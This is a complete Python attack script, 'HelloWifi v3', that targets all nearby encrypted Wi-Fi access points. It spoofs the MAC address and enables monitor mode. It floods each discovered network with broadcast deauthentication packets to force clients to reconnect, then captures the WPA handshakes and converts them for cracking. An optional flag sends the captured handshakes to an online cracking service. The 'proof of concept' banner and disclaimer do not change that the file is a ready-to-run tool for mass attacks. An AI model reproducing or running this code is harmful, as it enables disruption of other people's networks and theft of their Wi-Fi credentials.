#!/usr/bin/python3

###########################################
#                IMPORT                   #
# this section handles displaying banner, #
# importing libraries, and parsing user   #
# arguments                               #
###########################################

print("""             _   _      _ _       
            | | | |    | | |      
            | |_| | ___| | | ___  
            |  _  |/ _ \ | |/ _ \ 
            | | | |  __/ | | (_) |
            \_| |_/\___|_|_|\___/                                           
                                     _    _ _  __ _       
                                    | |  | (_)/ _(_)      
                                    | |  | |_| |_ _       
                                    | |/\| | |  _| |      
                                    \  /\  / | | | |      
                                     \/  \/|_|_| |_|      
    
        HelloWifi v3 automated mass handshake capture script
           This program was created as a proof of concept 
        I accept no responsibiliy for misuse of this program
                        
                        Created by: 0rphon
                
            
            
            """)


import threading, random, os, signal
from subprocess import check_output,call,Popen,PIPE
from sys import argv
from sys import stdout as standout
from scapy.all import *
from time import time,sleep
import argparse

parser=argparse.ArgumentParser(usage="HelloWifi.py [interface] [optional args]",formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument("interface",help="network interface to use")
parser.add_argument("-o","--output",help="set name of output file",type=str,default=str(random.randint(100,1000)),metavar="NAME")
parser.add_argument("-u","--upload",help="uploads handshake file to onlinehashcrack.com\nrequires valid email to send updates to",type=str,default="null",metavar="EMAIL")
args=parser.parse_args()





#################################
#          STARTUP              #
# this section handles getting  #
# interface, changing mac,      #
# getting start time, and other #
# general startup stuff         #
#################################

#gets arguments and sets up interface
def Startup():
    global interface,filename,starttime
    #set time started
    starttime=time()
    #set args
    interface = args.interface
    filename=args.output
    #if interface not named monitor mode interface name
    if "mon" not in interface:
        #if interface not monitor mode
        if interface+"mon" not in str(check_output("ifconfig",shell=True)):
            #changes mac and sets to monitor mode
            try:
                check_output("ifconfig {x} down && macchanger -r {x} && airmon-ng start {x}".format(x=interface),shell=True)
            except:
                exit()
        interface= interface+"mon"







########################
#       CAPTURE        #
# this section handles #
# the listening and    #
# storing of packets   #
########################

#listens for packets
def Listen():
    sniff(iface=interface, prn=Capture)

#saves packets to pcap file
def Capture(pkt):
    wrpcap('%s.pcap'%(filename), pkt, append=True)











##########################
#       DISPLAY          #
# this section handles   #
# displaying progress as #
# captured/found         #
##########################

#displays how many aps found and how many handshakes captured
captured=0
apAmount=0
stopProgress=False
def DisplayProgress():
    global captured, apAmount
    while stopProgress==False:
        standout.write(("\b"*100)+"%d out of %d access points exploited"%(captured,apAmount))
        standout.flush()
        sleep(0.1)













##################################################
#                  DISCOVER                      #
# this section handles finding APs.              #
# it starts by jumping channels for              #
# a few seconds while it discovers               #
# aps then stops hopping and listens             #
# on whatever channel is being switched          #
# to by the deauth function                      #
# when called it generates a global              #
# dictionary of mac:[channel, is encrypted Y/N]  #
##################################################

#changes channels every half second
stop_hopper = False
def hopper(iface):
    n = 1
    while stop_hopper==False:
        sleep(0.5)
        call('iwconfig %s channel %d' % (iface, n),shell=True)
        dig = int(random.random() * 14)
        if dig != 0 and dig != n:
            n = dig


#starts scanning for APs
def Find():
    sniff(iface=interface, prn=findAPs)

#define a bunch of variables
F_bssids = []    # Found BSSIDs
apData={}
#scans for APs
def findAPs(pkt):
    global apData, apAmount
    #if packet wifi beacon
    if pkt.haslayer(Dot11Beacon):
        #if not captued yet
       if pkt.addr2 not in F_bssids:
           #adds to capture list
           F_bssids.append(pkt.addr2)
           #gets channel
           channel= int( ord(pkt[Dot11Elt:3].info))
           #gets encryption data
           #network_stats currently bugged in scapy 2.4.2
           #enc=pkt[Dot11Beacon].network_stats()
           capability = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}\
                {Dot11ProbeResp:%Dot11ProbeResp.cap%}")
           if "privacy" in capability: enc = 'Y'
           else: enc  = 'N'
           #sets AP data in apData dict and increases apAmount
           apData[pkt.addr2]=[channel, enc]
           apAmount+=1








###################################################################
#                         ATTACK                                  #
# this section handles deauthentication. it continuously iterates #
# through the apData dictionary created by the discover section   #
# and sends deauth packets to the broadcast mac of the AP.        #
# it then uses aircrack-ng to check for how many handshakes       #
# have been captured so far and removes the captured ones from    #
# apData so they arent attacked again                             #
###################################################################

#launches the attack on found APs
def Attack():
    while True:
        #changes through channels
        for channel in range(1,15):
            call('iwconfig %s channel %d' % (interface, channel),shell=True)
            #iterates through apData
            for key,data in apData.copy().items():
                #if Ap has encryption and channel==current channel
                if data[0]==channel and data[1]=="Y":
                    #creates thread to send deauth
                    thread = threading.Thread(target=Deauth,args=(key,))
                    thread.daemon = True
                    thread.start()
            sleep(1)
            #checks for captured handshakes
            Check()


#sends deauth to target bssid
def Deauth(bssid):
    client="FF:FF:FF:FF:FF:FF"
    pkt = RadioTap()/Dot11(addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth()
    sendp(pkt, iface = interface, count = 18, inter = .1, verbose=0)

#checks for how many handshakes have been captured so far
def Check():
    global captured
    #reads pcap file for APs
    check=Popen(['timeout 1 aircrack-ng %s.pcap'%(filename)],shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    sleep(2)
    captured=0
    for line in check.stdout.readlines():
        #AP's if handshake captured
        if b"0 handshake" not in line and b"handshake" in line:
            #increment captured and remove AP from apData
            captured+=1
            apData.pop(line[6:23].decode().lower(),None)











#######################################################            
#                    FINISH                           #
# this section handles the ending of the script after #
# a KeyboardInterrupt has been detected. it displays  #
# the captured handshakes, converts the pcap file to  #
# hccapx, and changes the interface back to static.   #
# if the -u flag is set it then uploads the hccapx    #
# file to onlinehashcrack and displays the output of  #
# that program. if hcxtools is not installed and the  #
# -u flag is set it will install hcxtools             #
#######################################################

#displays final progress and exits
def Cleanup():
    #tells progress to stop updating
    global stopProgress
    stopProgress=True
    #removes progress counter
    standout.write("\b"*100)
    standout.flush()
    #prints time and count
    print("\nCaptured %d handshakes in %d minutes"%(captured,(time()-starttime)/60))
    #reads file
    check=Popen('exec aircrack-ng %s.pcap'%(filename),shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    sleep(2)
    check.kill()
    for line in check.stdout:
        #if handshake captured
        if b"0 handshake" not in line and b"handshake" in line:
            #print AP info
            print(line.replace(b"\n",b"").decode())
    print("Converting pcap file to hccapx")
    check_output("./cap2hccapx.bin {x}.pcap {x}.hccapx".format(x=filename),shell=True)
    print("Reverting interface")
    Popen(" airmon-ng stop %s"%(interface),shell=True, stdout=PIPE, stderr=PIPE)


#uploads file to onlinehachcrack.com
def UploadFile():
    #checks if hcxtools is installed
    try:
        check_output("wlancap2wpasec",shell=True,stdout=PIPE, stderr=PIPE)
    except:
        #if not installed
        print("Installing hcxtools")
        #install hcxtools and check to make sure it installed correctly
        if b"Setting up hcxtools" not in check_output("sudo apt-get install hcxtools",shell=True):
            #if not installed correctly tell user and exit
            print("Error installing hcxtools. File was not uploaded")
            exit()
    #if hcxtools installed then upload hccapx file to onlinehashcrack.com with the email provided by the user
    call("wlancap2wpasec -u https://api.onlinehashcrack.com  -e %s %s.hccapx"%(args.upload,filename),shell=True)









####################################################
#                  MAIN                            #
# this section handles the execution of HelloWifi. #
# it runs in this order: Startup, Listen, Display, #
# Hopper, Discovery, stops Hopper, Attack, and     #
# finally upon Keyboardinterupt it runs finish     #
####################################################

if __name__ == "__main__":

    try:
        #sets up interface and file name
        print("Preparing interface")
        Startup()

        #starts capturing packets
        thread = threading.Thread(target=Listen)
        thread.daemon = True
        thread.start()

        print("Starting attack (Ctrl+C to stop)")
        #starts displaying progress
        thread = threading.Thread(target=DisplayProgress)
        thread.daemon = True
        thread.start()

        #starts switching channels every half second
        thread = threading.Thread(target=hopper, args=(interface, ))
        thread.daemon = True
        thread.start()

        #starts finding APs
        thread = threading.Thread(target=Find)
        thread.daemon = True
        thread.start()
        sleep(7)

        #stops switching channels
        stop_hopper=True
        
        #starts deauth attacks on APs
        Attack()
    except KeyboardInterrupt: 
        Cleanup()
        if args.upload!="null":
            if captured>0:
                print("Uploading file to onlinehashcrack.com")
                UploadFile()
            else:print("Skipping upload because no handshakes captured")
